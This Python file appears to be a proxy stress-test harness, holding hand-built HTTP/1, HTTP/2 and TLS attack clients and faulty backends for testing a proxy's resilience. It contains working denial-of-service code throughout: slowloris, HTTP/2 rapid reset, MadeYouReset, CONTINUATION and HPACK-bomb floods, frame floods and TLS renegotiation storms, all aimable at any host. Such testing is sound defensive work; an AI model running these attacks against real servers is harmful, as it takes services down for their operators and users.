#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2000-2026 Willy Tarreau and HAProxy contributors. See LICENSE.
"""Hostile clients and misbehaving backends for the T247 battery.

    clients.py attack <scenario> <host> <port> <seconds> [workers]
    clients.py backend <hang|drip|reset> <port> <seconds>

Each attack runs for <seconds>, then closes everything and exits 0. No third-party
modules: HTTP/1 and HTTP/2 frames are built by hand (HPACK with static-table indexes and
literals only).
"""
import asyncio, os, random, re, socket, struct, subprocess, sys, threading, time

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
COUNT = {"conns": 0, "reqs": 0, "resps": 0, "errs": 0, "bytes_sent": 0}  # attacker-side counters, printed at exit


def frame(typ, flags, sid, payload=b""):
    return struct.pack(">I", len(payload))[1:] + bytes([typ, flags]) + struct.pack(">I", sid) + payload


def settings(items=()):
    return frame(4, 0, 0, b"".join(struct.pack(">HI", k, v) for k, v in items))


def hpack_int(v, prefix_bits, first):
    m = (1 << prefix_bits) - 1
    if v < m:
        return bytes([first | v])
    out = bytearray([first | m]); v -= m
    while v >= 128:
        out.append((v & 127) | 128); v >>= 7
    out.append(v)
    return bytes(out)


def hpack_lit(s):  # string literal, no Huffman
    return hpack_int(len(s), 7, 0) + s


def h2_request(sid, path=b"/?s=1k", extra=b"", end_stream=True):
    hb = b"\x82\x86" + b"\x04" + hpack_lit(path) + b"\x01" + hpack_lit(b"battery") + extra
    return frame(1, 0x4 | (0x1 if end_stream else 0), sid, hb)


def h2_big_header(n):  # literal, never-indexed, new name x-big
    return b"\x10" + hpack_lit(b"x-big") + hpack_lit(b"a" * n)


def rst(sid, code=8):
    return frame(3, 0, sid, struct.pack(">I", code))


def h1_get(path, extra=b"", close=False):
    return (b"GET " + path + b" HTTP/1.1\r\nHost: battery\r\n" + extra
            + (b"Connection: close\r\n" if close else b"") + b"\r\n")


class Deadline:
    def __init__(self, secs):
        self.end = time.monotonic() + secs

    def left(self):
        return self.end - time.monotonic()

    def over(self):
        return self.left() <= 0


async def connect(host, port, rcvbuf=None):
    s = socket.socket()
    s.setblocking(False)
    if rcvbuf:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
    loop = asyncio.get_running_loop()
    await loop.sock_connect(s, (host, port))
    COUNT["conns"] += 1
    return s


async def drain(s, dl, sleep=0.2):
    """Read and discard until EOF/error/deadline."""
    loop = asyncio.get_running_loop()
    try:
        while not dl.over():
            d = await asyncio.wait_for(loop.sock_recv(s, 65536), max(0.01, min(dl.left(), 5)))
            if not d:
                return
    except (asyncio.TimeoutError, OSError):
        pass


async def run_workers(n, dl, fn, *a):
    async def w(i):
        while not dl.over():
            try:
                await fn(i, dl, *a)
            except (OSError, asyncio.TimeoutError):
                COUNT["errs"] += 1
                await asyncio.sleep(0.05)
    await asyncio.gather(*[w(i) for i in range(n)])


# ---- scenarios -------------------------------------------------------------------------

async def slowloris(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, b"GET / HTTP/1.1\r\nHost: battery\r\n")
        while not dl.over():
            await asyncio.sleep(1.5)
            await loop.sock_sendall(s, b"X-a: b\r\n")  # never ends the header block
    finally:
        s.close()


async def slow_post(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, b"POST /?s=1k HTTP/1.1\r\nHost: battery\r\nContent-Length: 1000000\r\n\r\n")
        while not dl.over():
            await asyncio.sleep(1)
            await loop.sock_sendall(s, b"x")
    finally:
        s.close()


async def nonreader(i, dl, host, port, path=b"/?s=1g"):
    loop = asyncio.get_running_loop()
    s = await connect(host, port, rcvbuf=4096)
    try:
        await loop.sock_sendall(s, h1_get(path))
        while not dl.over():  # never read; hold. Reconnect only if the proxy closed us.
            await asyncio.sleep(1)
            try:
                if s.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT) == b"":
                    return
            except BlockingIOError:
                pass
    finally:
        s.close()


def h2_conn(host, port, init_settings=()):
    s = socket.create_connection((host, port))
    # a proxy that stops reading must not hang the attacker: the send fails and we reconnect.
    # H2_SEND_TIMEOUT=0 restores the stalling client (MY-3 reproducer).
    s.settimeout(float(os.environ.get("H2_SEND_TIMEOUT", "5")) or None)
    s.sendall(PREFACE + settings(init_settings))
    COUNT["conns"] += 1
    return s


def thread_pool(n, fn, dl, *a):
    ts = [threading.Thread(target=fn, args=(i, dl) + a, daemon=True) for i in range(n)]
    for t in ts: t.start()
    for t in ts: t.join()


def h2_rapid_reset_t(i, dl, host, port):
    while not dl.over():
        try:
            s = h2_conn(host, port)
            sid = 1
            while not dl.over() and sid < 2**30:
                buf = b"".join(h2_request(sid + 2 * k, b"/?s=1m", end_stream=True) + rst(sid + 2 * k)
                               for k in range(200))
                sid += 400
                s.sendall(buf)
                COUNT["reqs"] += 200; COUNT["bytes_sent"] += len(buf)
                try:
                    while s.recv(65536, socket.MSG_DONTWAIT):
                        pass
                except BlockingIOError:
                    pass
            s.close()
        except OSError:
            time.sleep(0.05)


def h2_flood_t(i, dl, host, port):
    reads = i % 2 == 0
    batch = (settings() + frame(6, 0, 0, b"12345678")) * 500
    while not dl.over():
        try:
            s = h2_conn(host, port)
            while not dl.over():
                s.sendall(batch)
                COUNT["bytes_sent"] += len(batch)
                if reads:
                    try:
                        while s.recv(65536, socket.MSG_DONTWAIT):
                            pass
                    except BlockingIOError:
                        pass
            s.close()
        except OSError:
            time.sleep(0.05)


async def h2_window0(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, PREFACE + settings([(4, 0)])
                                + b"".join(h2_request(1 + 2 * k, b"/?s=10m") for k in range(20)))
        await drain(s, dl)  # read (so the proxy's output flows) but never send WINDOW_UPDATE
    finally:
        s.close()


async def hdr_storm(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        for n in range(20):
            if dl.over():
                break
            kind = random.choice(("one8k", "many", "toobig"))
            if kind == "one8k":
                extra = b"X-Big: " + b"a" * 8000 + b"\r\n"
            elif kind == "many":
                extra = b"".join(b"X-%d: %s\r\n" % (k, b"b" * 80) for k in range(90))
            else:
                extra = b"X-Big: " + b"a" * 40000 + b"\r\n"
            await loop.sock_sendall(s, h1_get(b"/?s=1k", extra))
            got = b""
            while b"\r\n\r\n" not in got:
                d = await asyncio.wait_for(loop.sock_recv(s, 65536), 10)
                if not d:
                    return
                got += d
            if kind == "toobig":
                return  # the proxy should have answered 400 and closed
            await asyncio.sleep(0.01)
    finally:
        s.close()


async def hdr_storm_h2(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, PREFACE + settings())
        sid = 1
        while not dl.over() and sid < 100000:
            await loop.sock_sendall(s, h2_request(sid, b"/?s=1k", h2_big_header(8000)))
            sid += 2
            await drain(s, Deadline(0.05))
    finally:
        s.close()


async def churn_hold(i, dl, host, port):
    s = await connect(host, port)  # idle connection, held to push the process past maxconn
    try:
        await drain(s, dl)
    finally:
        s.close()


async def churn_fast(i, dl, host, port):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        if i % 2:
            await loop.sock_sendall(s, h1_get(b"/?s=1k", close=True))
            await drain(s, Deadline(2))
    finally:
        s.close()


async def bad_backend_client(i, dl, host, port, path):
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, h1_get(path, close=True))
        await drain(s, dl)
    finally:
        s.close()



# ---- protocol-spam scenarios (red team, 2026-10-11) -------------------------------------
# Every attack here is rate-capped: per-worker sleeps, a bounded worker count, and one
# Python process per attack (one core).  Targets are whatever battery.py passes, which is
# always 127.0.0.1 on the lab machine the battery runs on.

UAS = [b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
       b"Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
       b"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
       b"curl/8.9.1", b"Go-http-client/1.1", b"python-requests/2.32", b"Wget/1.24"]
WORDS = [b"index", b"blog", b"post", b"tag", b"page", b"search", b"api", b"v1", b"users", b"img", b"css", b"js"]


def rand_path():
    segs = b"/".join(random.choice(WORDS) + (b"-%d" % random.randrange(1000) if random.random() < 0.5 else b"")
                     for _ in range(random.randrange(1, 4)))
    qs = b"&".join(b"%s=%d" % (random.choice(WORDS), random.randrange(10**9)) for _ in range(random.randrange(0, 5)))
    return b"/" + segs + b"?s=1k" + (b"&" + qs if qs else b"")


def rand_headers():
    hs = [b"User-Agent: " + random.choice(UAS), b"Accept: */*",
          b"Accept-Language: " + random.choice([b"en-US,en;q=0.9", b"de-DE,de;q=0.8", b"fr", b"*"]),
          b"Cache-Control: no-cache", b"Pragma: no-cache",
          b"X-Forwarded-For: %d.%d.%d.%d" % tuple(random.randrange(1, 255) for _ in range(4)),
          b"Referer: http://%s.example/%s" % (random.choice(WORDS), random.choice(WORDS)),
          b"Cookie: sid=%032x" % random.getrandbits(128)]
    random.shuffle(hs)
    return b"".join(h + b"\r\n" for h in hs[:random.randrange(3, 9)])


async def read_h1_response(s, dl, timeout=10):
    """Read one HTTP/1.1 response (Content-Length or chunked); None on EOF/timeout."""
    loop = asyncio.get_running_loop()
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = await asyncio.wait_for(loop.sock_recv(s, 65536), min(timeout, max(dl.left(), 0.1)))
        if not d:
            return None
        buf += d
    head, rest = buf.split(b"\r\n\r\n", 1)
    lh = head.lower()
    if b"transfer-encoding: chunked" in lh:
        while not rest.endswith(b"0\r\n\r\n"):
            d = await asyncio.wait_for(loop.sock_recv(s, 65536), timeout)
            if not d:
                return None
            rest += d
    else:
        m = re.search(rb"content-length:\s*(\d+)", lh)
        n = int(m.group(1)) if m else 0
        while len(rest) < n:
            d = await asyncio.wait_for(loop.sock_recv(s, 65536), timeout)
            if not d:
                return None
            rest += d
    try:
        COUNT["resps"] += 1
        return int(head[9:12])
    except ValueError:
        return None


async def hoic_rand(i, dl, host, port):
    """HOIC-style: keep-alive, randomised path/query/headers/UA, 10% POST; <= 100 req/s per worker."""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        n = 0
        while not dl.over():
            if random.random() < 0.1:
                body = os.urandom(64).hex().encode()
                req = (b"POST " + rand_path() + b" HTTP/1.1\r\nHost: battery\r\n" + rand_headers()
                       + b"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n" % len(body) + body)
            else:
                req = b"GET " + rand_path() + b" HTTP/1.1\r\nHost: battery\r\n" + rand_headers() + b"\r\n"
            await loop.sock_sendall(s, req)
            COUNT["reqs"] += 1
            if await read_h1_response(s, dl) is None:
                return
            n += 1
            if n % 50 == 0:
                return  # reconnect now and then, like a real flooder
            await asyncio.sleep(0.01)
    finally:
        s.close()


async def h1_pipeline(i, dl, host, port):
    """100 pipelined GETs per write, responses read back; <= 20 batches/s per worker."""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        batch = b"".join(h1_get(b"/?s=1k", b"User-Agent: pipeline\r\n") for _ in range(100))
        while not dl.over():
            await loop.sock_sendall(s, batch)
            COUNT["reqs"] += 100
            for _ in range(100):
                if await read_h1_response(s, dl) is None:
                    return
            await asyncio.sleep(0.05)
    finally:
        s.close()


async def h1_range(i, dl, host, port):
    """GET of a 1 MB object with 1000 overlapping byte ranges in one Range header."""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        rng = b"Range: bytes=" + b",".join(b"%d-%d" % (k, k + 1000) for k in range(0, 2000, 2)) + b"\r\n"
        while not dl.over():
            await loop.sock_sendall(s, h1_get(b"/?s=1m", rng))
            COUNT["reqs"] += 1
            if await read_h1_response(s, dl) is None:
                return
            await asyncio.sleep(0.01)
    finally:
        s.close()


def h2_hb_fields(nbytes):
    """~nbytes of valid literal (never indexed) header fields."""
    out = b""
    k = 0
    while len(out) < nbytes:
        out += b"\x10" + hpack_lit(b"x-c%d" % k) + hpack_lit(b"v" * 48)
        k += 1
    return out


def try_drain(s):
    try:
        while s.recv(65536, socket.MSG_DONTWAIT):
            pass
    except (BlockingIOError, InterruptedError):
        pass


async def h2_continuation(i, dl, host, port):
    """HEADERS without END_HEADERS, then 1 KiB CONTINUATION frames forever (2024 CVE family).
    1 in 4 workers sends the CONTINUATION on the wrong stream id.  <= ~1 MB/s per worker."""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        sid = 1
        await loop.sock_sendall(s, PREFACE + settings() + frame(1, 0, sid, b"\x82\x86\x84\x41" + hpack_lit(b"battery")))
        chunk = h2_hb_fields(1024)
        csid = sid + 2 if i % 4 == 0 else sid
        while not dl.over():
            await loop.sock_sendall(s, frame(9, 0, csid, chunk))
            COUNT["bytes_sent"] += len(chunk) + 9
            try_drain(s)
            await asyncio.sleep(0.001)
    finally:
        s.close()


async def h2_cont_drip(i, dl, host, port):
    """Same, slowly: one 1 KiB CONTINUATION every 0.5 s on each of many connections."""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, PREFACE + settings() + frame(1, 0, 1, b"\x82\x86\x84\x41" + hpack_lit(b"battery")))
        chunk = h2_hb_fields(1024)
        while not dl.over():
            await asyncio.sleep(0.5)
            await loop.sock_sendall(s, frame(9, 0, 1, chunk))
            try_drain(s)
    finally:
        s.close()


async def h2_hpack_bomb(i, dl, host, port):
    """i%3==0: one 4 KB header into the dynamic table, then HEADERS of 4000 indexed references
    (4 KB on the wire, 16 MB decoded).  i%3==1: dynamic table size update far above the allowed
    maximum (must be a COMPRESSION_ERROR).  i%3==2: SETTINGS_HEADER_TABLE_SIZE 2^32-1 then
    normal requests.  <= 200 frames/s per worker."""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        kind = i % 3
        init = settings([(1, 0xFFFFFFFF)]) if kind == 2 else settings()
        await loop.sock_sendall(s, PREFACE + init)
        sid = 1
        if kind == 0:
            await loop.sock_sendall(s, frame(1, 0x5, sid, b"\x82\x86\x84\x41" + hpack_lit(b"battery")
                                             + b"\x40" + hpack_lit(b"x-bomb") + hpack_lit(b"a" * 4000)))
            sid += 2
            bomb = b"\x82\x86\x84\x41" + hpack_lit(b"battery") + b"\xbe" * 4000
        while not dl.over():
            if kind == 0:
                hb = bomb
            elif kind == 1:
                hb = hpack_int(1 << 30, 5, 0x20) + b"\x82\x86\x84\x41" + hpack_lit(b"battery")
            else:
                hb = b"\x82\x86\x84\x41" + hpack_lit(b"battery") + h2_hb_fields(64)
            await loop.sock_sendall(s, frame(1, 0x5, sid, hb))
            COUNT["reqs"] += 1; COUNT["bytes_sent"] += len(hb) + 9
            sid += 2
            try_drain(s)
            await asyncio.sleep(0.005)
    finally:
        s.close()


def h2_madeyoureset_t(i, dl, host, port):
    """MadeYouReset (CVE-2025-8671 family): a valid request, then a frame that forces the
    *server* to reset the stream, so the backend work continues while the client never counts
    an RST of its own.  Batches of 200 like h2_rapid_reset; 5 trigger variants."""
    def trigger(sid, k):
        k %= 5
        if k == 0: return frame(8, 0, sid, struct.pack(">I", 0))                 # WINDOW_UPDATE increment 0
        if k == 1: return frame(2, 0, sid, struct.pack(">IB", sid, 16))           # PRIORITY depends on itself
        if k == 2: return frame(0, 0, sid, b"x")                                   # DATA after END_STREAM
        if k == 3: return frame(8, 0, sid, struct.pack(">I", 0x7FFFFFFF))         # window overflow
        return h2_request(sid, b"/?s=1k")                                          # HEADERS after END_STREAM
    b = i  # one trigger variant per batch, rotating: a variant that costs the connection does
           # not shadow the ones that only cost the stream
    while not dl.over():
        try:
            s = h2_conn(host, port)
            sid = 1
            while not dl.over() and sid < 2**30:
                buf = b"".join(h2_request(sid + 2 * k, b"/?s=1m") + trigger(sid + 2 * k, b) for k in range(200))
                sid += 400; b += 1
                s.sendall(buf)
                COUNT["reqs"] += 200; COUNT["bytes_sent"] += len(buf)
                try_drain(s)
                time.sleep(0.005)
            s.close()
        except OSError:
            time.sleep(0.05)


def h2_frame_flood_t(kind):
    """PRIORITY / empty DATA / WINDOW_UPDATE floods (CVE-2019-9513/9518/9511 shapes).
    Batches of 1000 frames; half the workers read the replies, half do not."""
    def t(i, dl, host, port):
        reads = i % 2 == 0
        while not dl.over():
            try:
                s = h2_conn(host, port)
                if kind == "priority":
                    batch = b"".join(frame(2, 0, 1 + 2 * k, struct.pack(">IB", 0, 16)) for k in range(1000))
                elif kind == "empty_data":
                    s.sendall(frame(1, 0x4, 1, b"\x83\x86\x84\x41" + hpack_lit(b"battery")))  # POST, stream open
                    batch = frame(0, 0, 1, b"") * 1000
                else:  # wu_storm: one big response, then WINDOW_UPDATE +1 storms on stream and connection
                    s.sendall(h2_request(1, b"/?s=10m"))
                    batch = (frame(8, 0, 1, struct.pack(">I", 1)) + frame(8, 0, 0, struct.pack(">I", 1))) * 500
                while not dl.over():
                    s.sendall(batch)
                    COUNT["bytes_sent"] += len(batch)
                    if reads:
                        try_drain(s)
                    time.sleep(0.002)
                s.close()
            except OSError:
                time.sleep(0.05)
    return t


async def h2_streams(i, dl, host, port):
    """Open 300 streams per connection (POST, never finished), far past
    SETTINGS_MAX_CONCURRENT_STREAMS, hold them."""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, PREFACE + settings())
        for k in range(300):
            await loop.sock_sendall(s, frame(1, 0x4, 1 + 2 * k, b"\x83\x86\x84\x41" + hpack_lit(b"battery")))
            if k % 50 == 49:
                await asyncio.sleep(0.01)
        await drain(s, dl)
    finally:
        s.close()


async def h2_preface_idle(i, dl, host, port):
    """Preface + SETTINGS, then nothing, at flood scale (above maxconn)."""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, PREFACE + settings())
        await drain(s, dl)
    finally:
        s.close()


def client_hello(sni=b"lab.local", alpn=(b"h2", b"http/1.1"), pad=0):
    def ext(t, body): return struct.pack(">HH", t, len(body)) + body
    ciphers = bytes.fromhex("130113021303c02bc02fc02cc030cca9cca8009c009d002f0035")
    sni_e = ext(0, struct.pack(">H", len(sni) + 3) + b"\x00" + struct.pack(">H", len(sni)) + sni)
    al = b"".join(bytes([len(a)]) + a for a in alpn)
    exts = (sni_e + ext(10, b"\x00\x06\x00\x1d\x00\x17\x00\x18") + ext(13, b"\x00\x08\x04\x03\x08\x04\x04\x01\x05\x03")
            + ext(43, b"\x04\x03\x04\x03\x03") + ext(51, struct.pack(">H", 36) + b"\x00\x1d\x00\x20" + os.urandom(32))
            + ext(45, b"\x01\x01") + ext(16, struct.pack(">H", len(al)) + al) + (ext(21, b"\x00" * pad) if pad else b""))
    body = (b"\x03\x03" + os.urandom(32) + b"\x00" + struct.pack(">H", len(ciphers)) + ciphers + b"\x01\x00"
            + struct.pack(">H", len(exts)) + exts)
    hs = b"\x01" + struct.pack(">I", len(body))[1:] + body
    return b"".join(b"\x16\x03\x01" + struct.pack(">H", len(hs[o:o + 16384])) + hs[o:o + 16384] for o in range(0, len(hs), 16384))


async def tls_hello_only(i, dl, host, port):
    """i%3==0: a full ClientHello then silence; 1: half a ClientHello; 2: a ClientHello with a
    bogus SNI, 100 ALPN entries and 8 KB of padding.  Hold until the proxy closes, reconnect."""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        k = i % 3
        if k == 0:
            data = client_hello()
        elif k == 1:
            data = client_hello()[: len(client_hello()) // 2]
        else:
            data = client_hello(b"x" * 200 + b".invalid", tuple(b"proto%d" % n for n in range(100)) + (b"h2",), 8000)
        await loop.sock_sendall(s, data)
        await drain(s, dl)
    finally:
        s.close()


def tls_reneg_t(i, dl, host, port):
    """TLS 1.2 client-initiated renegotiation attempts via openssl s_client ('R' command),
    20/s per worker, reconnect when the server drops us."""
    while not dl.over():
        try:
            p = subprocess.Popen(["openssl", "s_client", "-connect", f"{host}:{port}", "-tls1_2", "-no_ticket",
                                  "-servername", "lab.local"], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL)
            while not dl.over() and p.poll() is None:
                p.stdin.write(b"R\n"); p.stdin.flush()
                time.sleep(0.05)
        except (OSError, BrokenPipeError):
            time.sleep(0.05)
        finally:
            try:
                p.stdin.close()
            except Exception:
                pass
            try:
                p.kill(); p.wait()
            except Exception:
                pass


async def maxconn_full(i, dl, host, port):
    """A complete request to a backend that never answers; thousands of them, above maxconn.
    What does a new legitimate client see while the proxy is full?"""
    loop = asyncio.get_running_loop()
    s = await connect(host, port)
    try:
        await loop.sock_sendall(s, h1_get(b"/hang"))
        await drain(s, dl)
    finally:
        s.close()


def attack(name, host, port, secs, n):
    dl = Deadline(secs)
    aio = lambda fn, count, *a: asyncio.run(run_workers(count, dl, fn, host, port, *a))
    if name == "slowloris": aio(slowloris, n or 1800)
    elif name == "slow_post": aio(slow_post, n or 500)
    elif name == "nonreader": aio(nonreader, n or 300)
    elif name == "h2_rapid_reset": thread_pool(n or 4, h2_rapid_reset_t, dl, host, port)
    elif name == "h2_flood": thread_pool(n or 8, h2_flood_t, dl, host, port)
    elif name == "h2_window0": aio(h2_window0, n or 100)
    elif name == "hdr_storm": aio(hdr_storm, n or 16)
    elif name == "hdr_storm_h2": aio(hdr_storm_h2, n or 16)
    elif name == "churn":
        async def both():
            await asyncio.gather(run_workers(2500, dl, churn_hold, host, port),
                                 run_workers(50, dl, churn_fast, host, port))
        asyncio.run(both())
    elif name == "be_hang": aio(bad_backend_client, n or 400, b"/hang")
    elif name == "be_drip": aio(bad_backend_client, n or 400, b"/drip")
    elif name == "be_reset": aio(bad_backend_client, n or 50, b"/reset")
    elif name == "hoic_rand": aio(hoic_rand, n or 32)
    elif name == "h1_pipeline": aio(h1_pipeline, n or 32)
    elif name == "h1_range": aio(h1_range, n or 64)
    elif name == "h2_continuation": aio(h2_continuation, n or 16)
    elif name == "h2_cont_drip": aio(h2_cont_drip, n or 400)
    elif name == "h2_hpack_bomb": aio(h2_hpack_bomb, n or 16)
    elif name == "h2_madeyoureset": thread_pool(n or 4, h2_madeyoureset_t, dl, host, port)
    elif name == "h2_priority_flood": thread_pool(n or 8, h2_frame_flood_t("priority"), dl, host, port)
    elif name == "h2_empty_data": thread_pool(n or 8, h2_frame_flood_t("empty_data"), dl, host, port)
    elif name == "h2_wu_storm": thread_pool(n or 8, h2_frame_flood_t("wu_storm"), dl, host, port)
    elif name == "h2_streams": aio(h2_streams, n or 200)
    elif name == "h2_preface_idle": aio(h2_preface_idle, n or 3000)
    elif name == "tls_hello_only": aio(tls_hello_only, n or 2500)
    elif name == "tls_reneg": thread_pool(n or 50, tls_reneg_t, dl, host, port)
    elif name == "maxconn_full": aio(maxconn_full, n or 2500)
    else: sys.exit("unknown scenario " + name)
    import json
    print("SUMMARY " + json.dumps(COUNT), flush=True)


# ---- misbehaving backends --------------------------------------------------------------

def serve(kind, port, secs):
    dl = Deadline(secs)
    ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("127.0.0.1", port)); ls.listen(4096)

    def handle(c):
        try:
            c.settimeout(5)
            c.recv(65536)
            if kind == "hang":
                while not dl.over(): time.sleep(1)
            elif kind == "drip":
                c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 1000000\r\n\r\n")
                while not dl.over():
                    time.sleep(1); c.sendall(b"x")
            elif kind == "reset":
                c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 100000\r\n\r\n" + b"y" * 10000)
                time.sleep(0.05)
                c.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        except OSError:
            pass
        finally:
            c.close()
    ls.settimeout(1)
    while not dl.over():
        try:
            c, _ = ls.accept()
        except socket.timeout:
            continue
        threading.Thread(target=handle, args=(c,), daemon=True).start()


if __name__ == "__main__":
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
    if sys.argv[1] == "attack":
        attack(sys.argv[2], sys.argv[3], int(sys.argv[4]), float(sys.argv[5]),
               int(sys.argv[6]) if len(sys.argv) > 6 else 0)
    elif sys.argv[1] == "backend":
        serve(sys.argv[2], int(sys.argv[3]), float(sys.argv[4]))
